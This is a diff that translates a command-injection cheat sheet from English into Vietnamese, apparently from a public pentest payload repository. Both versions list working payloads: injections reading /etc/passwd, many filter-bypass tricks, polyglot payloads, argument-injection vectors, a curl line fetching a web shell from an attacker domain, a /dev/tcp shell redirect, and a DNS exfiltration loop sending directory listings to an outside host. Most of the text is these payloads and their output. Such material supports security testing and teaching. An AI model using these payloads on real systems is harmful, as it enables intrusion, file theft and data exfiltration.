@@ -1,56 +1,56 @@
-# Command Injection
+# Command Injection (Chèn lệnh)
 
-> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+> Command injection (chèn lệnh) là một lỗ hổng bảo mật cho phép kẻ tấn công thực thi các lệnh tùy ý bên trong một ứng dụng dễ bị tấn công.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Basic Commands](#basic-commands)
-    * [Chaining Commands](#chaining-commands)
-    * [Argument Injection](#argument-injection)
-    * [Inside A Command](#inside-a-command)
-* [Filter Bypasses](#filter-bypasses)
-    * [Bypass Without Space](#bypass-without-space)
-    * [Bypass With A Line Return](#bypass-with-a-line-return)
-    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
-    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
-    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
-    * [Bypass Characters Filter](#bypass-characters-filter)
-    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
-    * [Bypass With Single Quote](#bypass-with-single-quote)
-    * [Bypass With Double Quote](#bypass-with-double-quote)
-    * [Bypass With Backticks](#bypass-with-backticks)
-    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)
-    * [Bypass With $@](#bypass-with-)
-    * [Bypass With $()](#bypass-with--1)
-    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
-    * [Bypass With Wildcards](#bypass-with-wildcards)
-    * [Bypass With Random Case](#bypass-with-random-case)
-* [Data Exfiltration](#data-exfiltration)
-    * [Time Based Data Exfiltration](#time-based-data-exfiltration)
-    * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
-* [Polyglot Command Injection](#polyglot-command-injection)
-* [Tricks](#tricks)
-    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)
-    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)
-* [Labs](#labs)
-    * [Challenge](#challenge)
-* [References](#references)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
+    * [Các lệnh cơ bản](#basic-commands)
+    * [Chuỗi lệnh](#chaining-commands)
+    * [Chèn tham số (Argument Injection)](#argument-injection)
+    * [Bên trong một lệnh](#inside-a-command)
+* [Vượt qua bộ lọc](#filter-bypasses)
+    * [Vượt qua không cần khoảng trắng](#bypass-without-space)
+    * [Vượt qua bằng ký tự xuống dòng](#bypass-with-a-line-return)
+    * [Vượt qua bằng backslash và xuống dòng](#bypass-with-backslash-newline)
+    * [Vượt qua bằng Tilde Expansion](#bypass-with-tilde-expansion)
+    * [Vượt qua bằng Brace Expansion](#bypass-with-brace-expansion)
+    * [Vượt qua bộ lọc ký tự](#bypass-characters-filter)
+    * [Vượt qua bộ lọc ký tự qua mã hóa Hex](#bypass-characters-filter-via-hex-encoding)
+    * [Vượt qua bằng dấu nháy đơn](#bypass-with-single-quote)
+    * [Vượt qua bằng dấu nháy kép](#bypass-with-double-quote)
+    * [Vượt qua bằng dấu backtick](#bypass-with-backticks)
+    * [Vượt qua bằng Backslash và Slash](#bypass-with-backslash-and-slash)
+    * [Vượt qua bằng $@](#bypass-with-)
+    * [Vượt qua bằng $()](#bypass-with--1)
+    * [Vượt qua bằng Variable Expansion](#bypass-with-variable-expansion)
+    * [Vượt qua bằng Wildcards](#bypass-with-wildcards)
+    * [Vượt qua bằng cách viết hoa/thường ngẫu nhiên](#bypass-with-random-case)
+* [Khai thác dữ liệu (Data Exfiltration)](#data-exfiltration)
+    * [Khai thác dữ liệu dựa trên thời gian](#time-based-data-exfiltration)
+    * [Khai thác dữ liệu dựa trên DNS](#dns-based-data-exfiltration)
+* [Chèn lệnh dạng Polyglot](#polyglot-command-injection)
+* [Mẹo hay](#tricks)
+    * [Chạy nền các lệnh chạy lâu](#backgrounding-long-running-commands)
+    * [Loại bỏ các tham số sau vị trí chèn](#remove-arguments-after-the-injection)
+* [Bài lab](#labs)
+    * [Thử thách](#challenge)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool
-* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
+* [commixproject/commix](https://github.com/commixproject/commix) - Công cụ tự động toàn diện (All-in-One) để chèn lệnh OS và khai thác
+* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - Máy chủ và thư viện client thu thập tương tác OOB (out-of-band)
 
-## Methodology
+## Phương pháp
 
-Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.
+Command injection, còn được gọi là shell injection, là một dạng tấn công trong đó kẻ tấn công có thể thực thi các lệnh tùy ý trên hệ điều hành máy chủ thông qua một ứng dụng dễ bị tấn công. Lỗ hổng này có thể tồn tại khi một ứng dụng truyền dữ liệu không an toàn do người dùng cung cấp (form, cookie, HTTP header, v.v.) đến một system shell. Trong ngữ cảnh này, system shell là một giao diện dòng lệnh xử lý các lệnh được thực thi, thường là trên hệ thống Unix hoặc Linux.
 
-The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.
+Sự nguy hiểm của command injection là nó có thể cho phép kẻ tấn công thực thi bất kỳ lệnh nào trên hệ thống, có khả năng dẫn đến việc toàn bộ hệ thống bị xâm phạm.
 
-**Example of Command Injection with PHP**:
-Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
+**Ví dụ về Command Injection với PHP**:
+Giả sử bạn có một script PHP nhận đầu vào từ người dùng để ping một địa chỉ IP hoặc domain được chỉ định:
 
 ```php
 <?php
@@ -59,15 +59,15 @@ Suppose you have a PHP script that takes a user input to ping a specified IP add
 ?>
 ```
 
-In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.
+Trong đoạn mã trên, script PHP sử dụng hàm `system()` để thực thi lệnh `ping` với địa chỉ IP hoặc domain do người dùng cung cấp thông qua tham số GET `ip`.
 
-If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.
+Nếu kẻ tấn công cung cấp đầu vào như `8.8.8.8; cat /etc/passwd`, lệnh thực tế được thực thi sẽ là: `ping -c 4 8.8.8.8; cat /etc/passwd`.
 
-This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.
+Điều này có nghĩa là hệ thống trước tiên sẽ `ping 8.8.8.8` rồi sau đó thực thi lệnh `cat /etc/passwd`, lệnh này sẽ hiển thị nội dung của file `/etc/passwd`, có khả năng làm lộ thông tin nhạy cảm.
 
-### Basic Commands
+### Các lệnh cơ bản
 
-Execute the command and voila :p
+Thực thi lệnh và xong :p
 
 ```powershell
 cat /etc/passwd
@@ -78,28 +78,28 @@ sys:x:3:3:sys:/dev:/bin/sh
 ...
 ```
 
-### Chaining Commands
+### Chuỗi lệnh
 
-In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands.
+Trong nhiều giao diện dòng lệnh, đặc biệt là các hệ thống giống Unix, có một số ký tự có thể được dùng để nối chuỗi hoặc thao tác các lệnh.
 
-* `;` (Semicolon): Allows you to execute multiple commands sequentially.
-* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
-* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
-* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
-* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.
+* `;` (Dấu chấm phẩy): Cho phép thực thi nhiều lệnh tuần tự.
+* `&&` (AND): Chỉ thực thi lệnh thứ hai nếu lệnh đầu tiên thành công (trả về mã thoát bằng 0).
+* `||` (OR): Chỉ thực thi lệnh thứ hai nếu lệnh đầu tiên thất bại (trả về mã thoát khác 0).
+* `&` (Nền/Background): Thực thi lệnh ở chế độ nền, cho phép người dùng tiếp tục sử dụng shell.
+* `|` (Pipe): Lấy đầu ra của lệnh đầu tiên và dùng làm đầu vào cho lệnh thứ hai.
 
 ```powershell
-command1; command2   # Execute command1 and then command2
-command1 && command2 # Execute command2 only if command1 succeeds
-command1 || command2 # Execute command2 only if command1 fails
-command1 & command2  # Execute command1 in the background
-command1 | command2  # Pipe the output of command1 into command2
+command1; command2   # Thực thi command1 rồi đến command2
+command1 && command2 # Chỉ thực thi command2 nếu command1 thành công
+command1 || command2 # Chỉ thực thi command2 nếu command1 thất bại
+command1 & command2  # Thực thi command1 ở chế độ nền
+command1 | command2  # Đưa đầu ra của command1 vào command2
 ```
 
-### Argument Injection
+### Chèn tham số (Argument Injection)
 
-Gain a command execution when you can only append arguments to an existing command.
-Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.
+Đạt được khả năng thực thi lệnh khi bạn chỉ có thể thêm (append) tham số vào một lệnh đã có sẵn.
+Sử dụng trang web này [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) để tìm tham số cần chèn nhằm đạt được khả năng thực thi lệnh.
 
 * Chrome
 
@@ -119,93 +119,93 @@ Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github
     psql -o'|id>/tmp/foo'
     ```
 
-Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.
+Argument injection có thể bị lạm dụng bằng kỹ thuật [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/).
 
-In the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02) instead of the **regular double quotes** (U+0022)
+Trong ví dụ sau, payload `＂ --use-askpass=calc ＂` sử dụng **dấu nháy kép fullwidth** (U+FF02) thay vì **dấu nháy kép thông thường** (U+0022)
 
 ```php
 $url = "https://example.tld/" . $_GET['path'] . ".txt";
 system("wget.exe -q " . escapeshellarg($url));
 ```
 
-Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.
+Đôi khi, việc thực thi lệnh trực tiếp từ vị trí chèn có thể không khả thi, nhưng bạn có thể chuyển hướng luồng vào một file cụ thể, cho phép bạn triển khai một web shell.
 
 * curl
 
     ```ps1
-    # -o, --output <file>        Write to file instead of stdout
+    # -o, --output <file>        Ghi ra file thay vì xuất ra stdout
     curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
     ```
 
-### Inside A Command
+### Bên trong một lệnh
 
-* Command injection using backticks.
+* Chèn lệnh bằng dấu backtick.
 
   ```bash
   original_cmd_by_server `cat /etc/passwd`
   ```
 
-* Command injection using substitution
+* Chèn lệnh bằng phép thế (substitution)
 
   ```bash
   original_cmd_by_server $(cat /etc/passwd)
   ```
 
-## Filter Bypasses
+## Vượt qua bộ lọc
 
-### Bypass Without Space
+### Vượt qua không cần khoảng trắng
 
-* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead.
+* `$IFS` là một biến shell đặc biệt gọi là Internal Field Separator (Ký tự phân tách trường nội bộ). Theo mặc định, trong nhiều shell, nó chứa các ký tự khoảng trắng (dấu cách, tab, xuống dòng). Khi được dùng trong một lệnh, shell sẽ diễn giải `$IFS` như một dấu cách. `$IFS` không hoạt động trực tiếp như một dấu phân tách trong các lệnh như `ls`, `wget`; hãy dùng `${IFS}` thay thế.
 
   ```powershell
   cat${IFS}/etc/passwd
   ls${IFS}-la
   ```
 
-* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
+* Trong một số shell, brace expansion (mở rộng dấu ngoặc nhọn) tạo ra các chuỗi tùy ý. Khi thực thi, shell sẽ coi các mục bên trong dấu ngoặc nhọn là các lệnh hoặc tham số riêng biệt.
 
   ```powershell
   {cat,/etc/passwd}
   ```
 
-* Input redirection. The < character tells the shell to read the contents of the file specified.
+* Chuyển hướng đầu vào (Input redirection). Ký tự < báo cho shell đọc nội dung của file được chỉ định.
 
   ```powershell
   cat</etc/passwd
   sh</dev/tcp/127.0.0.1/4242
   ```
 
-* ANSI-C Quoting
+* Trích dẫn kiểu ANSI-C (ANSI-C Quoting)
 
   ```powershell
   X=$'uname\x20-a'&&$X
   ```
 
-* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
+* Ký tự tab đôi khi có thể được dùng thay thế cho dấu cách. Trong ASCII, ký tự tab được biểu diễn bằng giá trị thập lục phân `09`.
 
   ```powershell
   ;ls%09-al%09/home
   ```
 
-* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
+* Trên Windows, `%VARIABLE:~start,length%` là cú pháp được dùng để thao tác chuỗi con trên các biến môi trường.
 
   ```powershell
   ping%CommonProgramFiles:~10,-18%127.0.0.1
   ping%PROGRAMFILES:~10,-5%127.0.0.1
   ```
 
-### Bypass With A Line Return
+### Vượt qua bằng ký tự xuống dòng
 
-Commands can also be run in sequence with newlines
+Các lệnh cũng có thể được chạy tuần tự bằng ký tự xuống dòng
 
 ```bash
 original_cmd_by_server
 ls
 ```
 
-### Bypass With Backslash Newline
+### Vượt qua bằng backslash và xuống dòng
 
-* Commands can be broken into parts by using backslash followed by a newline
+* Các lệnh có thể được chia thành nhiều phần bằng cách dùng backslash theo sau bởi một ký tự xuống dòng
 
   ```powershell
   $ cat /et\
@@ -213,20 +213,20 @@ ls
   sswd
   ```
 
-* URL encoded form would look like this:
+* Dạng mã hóa URL sẽ trông như sau:
 
   ```powershell
   cat%20/et%5C%0Ac/pa%5C%0Asswd
   ```
 
-### Bypass With Tilde Expansion
+### Vượt qua bằng Tilde Expansion
 
 ```powershell
 echo ~+
 echo ~-
 ```
 
-### Bypass With Brace Expansion
+### Vượt qua bằng Brace Expansion
 
 ```powershell
 {,ip,a}
@@ -238,9 +238,9 @@ echo ~-
 {,/?s?/?i?/c?t,/e??/p??s??,}
 ```
 
-### Bypass Characters Filter
+### Vượt qua bộ lọc ký tự
 
-Commands execution without backslash and slash - linux bash
+Thực thi lệnh mà không cần backslash và slash - linux bash
 
 ```powershell
 swissky@crashlab:~$ echo ${HOME:0:1}
@@ -259,7 +259,7 @@ swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')p
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass Characters Filter Via Hex Encoding
+### Vượt qua bộ lọc ký tự qua mã hóa Hex
 
 ```powershell
 swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -287,7 +287,7 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass With Single Quote
+### Vượt qua bằng dấu nháy đơn
 
 ```powershell
 w'h'o'am'i
@@ -295,7 +295,7 @@ wh''oami
 'w'hoami
 ```
 
-### Bypass With Double Quote
+### Vượt qua bằng dấu nháy kép
 
 ```powershell
 w"h"o"am"i
@@ -303,29 +303,29 @@ wh""oami
 "wh"oami
 ```
 
-### Bypass With Backticks
+### Vượt qua bằng dấu backtick
 
 ```powershell
 wh``oami
 ```
 
-### Bypass With Backslash and Slash
+### Vượt qua bằng Backslash và Slash
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-### Bypass With $@
+### Vượt qua bằng $@
 
-`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
+`$0`: Chỉ đến tên của script nếu nó đang được chạy như một script. Nếu bạn đang ở trong một phiên shell tương tác, `$0` thường sẽ cho ra tên của shell.
 
 ```powershell
 who$@ami
 echo whoami|$0
 ```
 
-### Bypass With $()
+### Vượt qua bằng $()
 
 ```powershell
 who$()ami
@@ -333,7 +333,7 @@ who$(echo am)i
 who`echo am`i
 ```
 
-### Bypass With Variable Expansion
+### Vượt qua bằng Variable Expansion
 
 ```powershell
 /???/??t /???/p??s??
@@ -343,28 +343,28 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-### Bypass With Wildcards
+### Vượt qua bằng Wildcards
 
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
 
-### Bypass With Random Case
+### Vượt qua bằng cách viết hoa/thường ngẫu nhiên
 
-Windows does not distinguish between uppercase and lowercase letters when interpreting commands or file paths. For example, `DIR`, `dir`, or `DiR` will all execute the same `dir` command.
+Windows không phân biệt giữa chữ hoa và chữ thường khi diễn giải các lệnh hoặc đường dẫn file. Ví dụ, `DIR`, `dir`, hoặc `DiR` đều sẽ thực thi cùng một lệnh `dir`.
 
 ```powershell
 wHoAmi
 ```
 
-## Data Exfiltration
+## Khai thác dữ liệu (Data Exfiltration)
 
-### Time Based Data Exfiltration
+### Khai thác dữ liệu dựa trên thời gian
 
-Extracting data char by char and detect the correct value based on the delay.
+Trích xuất dữ liệu từng ký tự một và phát hiện giá trị đúng dựa trên độ trễ.
 
-* Correct value: wait 5 seconds
+* Giá trị đúng: chờ 5 giây
 
   ```powershell
   swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
@@ -373,7 +373,7 @@ Extracting data char by char and detect the correct value based on the delay.
   sys 0m0.000s
   ```
 
-* Incorrect value: no delay
+* Giá trị sai: không có độ trễ
 
   ```powershell
   swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
@@ -382,65 +382,65 @@ Extracting data char by char and detect the correct value based on the delay.
   sys 0m0.000s
   ```
 
-### Dns Based Data Exfiltration
+### Khai thác dữ liệu dựa trên DNS
 
-Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
+Dựa trên công cụ từ [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), cũng được host tại [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
 
-1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
-2. Execute a simple 'ls'
+1. Truy cập [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
+2. Thực thi một lệnh 'ls' đơn giản
 
   ```powershell
   for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
   ```
 
-Online tools to check for DNS based data exfiltration:
+Các công cụ trực tuyến để kiểm tra việc khai thác dữ liệu dựa trên DNS:
 
 * [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
 * [app.interactsh.com](https://app.interactsh.com)
 * [portswigger.net](https://portswigger.net/burp/documentation/collaborator)
 
-## Polyglot Command Injection
+## Chèn lệnh dạng Polyglot
 
-A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
+Một polyglot là một đoạn mã hợp lệ và có thể thực thi trong nhiều ngôn ngữ lập trình hoặc môi trường khác nhau cùng một lúc. Khi nói về "chèn lệnh dạng polyglot" (polyglot command injection), chúng ta đang đề cập đến một payload chèn có thể được thực thi trong nhiều ngữ cảnh hoặc môi trường khác nhau.
 
-* Example 1:
+* Ví dụ 1:
 
   ```powershell
   Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 
-  # Context inside commands with single and double quote:
+  # Ngữ cảnh bên trong các lệnh với dấu nháy đơn và nháy kép:
   echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   ```
 
-* Example 2:
+* Ví dụ 2:
 
   ```powershell
   Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 
-  # Context inside commands with single and double quote:
+  # Ngữ cảnh bên trong các lệnh với dấu nháy đơn và nháy kép:
   echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
   echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
   echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
   ```
 
-## Tricks
+## Mẹo hay
 
-### Backgrounding Long Running Commands
+### Chạy nền các lệnh chạy lâu
 
-In some instances, you might have a long running command that gets killed by the process injecting it timing out.
-Using `nohup`, you can keep the process running after the parent process exits.
+Trong một số trường hợp, bạn có thể có một lệnh chạy lâu bị hủy do tiến trình cha (đang chèn nó vào) hết thời gian chờ.
+Sử dụng `nohup`, bạn có thể giữ cho tiến trình tiếp tục chạy sau khi tiến trình cha thoát.
 
 ```bash
 nohup sleep 120 > /dev/null &
 ```
 
-### Remove Arguments After The Injection
+### Loại bỏ các tham số sau vị trí chèn
 
-In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
+Trong các giao diện dòng lệnh kiểu Unix, ký hiệu `--` được dùng để báo hiệu kết thúc các tùy chọn của lệnh. Sau `--`, tất cả các tham số sẽ được coi là tên file và tham số, chứ không phải là tùy chọn.
 
-## Labs
+## Bài lab
 
 * [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
 * [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
@@ -452,17 +452,17 @@ In Unix-like command-line interfaces, the `--` symbol is used to signify the end
 * [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
 * [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)
 
-### Challenge
+### Thử thách
 
-Challenge based on the previous tricks, what does the following command do:
+Thử thách dựa trên các mẹo trên, lệnh sau đây làm gì:
 
 ```powershell
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ```
 
-**NOTE**: The command is safe to run, but you should not trust me.
+**LƯU Ý**: Lệnh này an toàn để chạy, nhưng bạn không nên tin tưởng tôi.
 
-## References
+## Tài liệu tham khảo
 
 * [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://web.archive.org/web/20250306133700/https://staaldraad.github.io/post/2019-11-24-argument-injection/)
 * [Argument Injection Vectors - SonarSource - February 21, 2023](https://web.archive.org/web/20251211212046/https://sonarsource.github.io/argument-injection-vectors/)
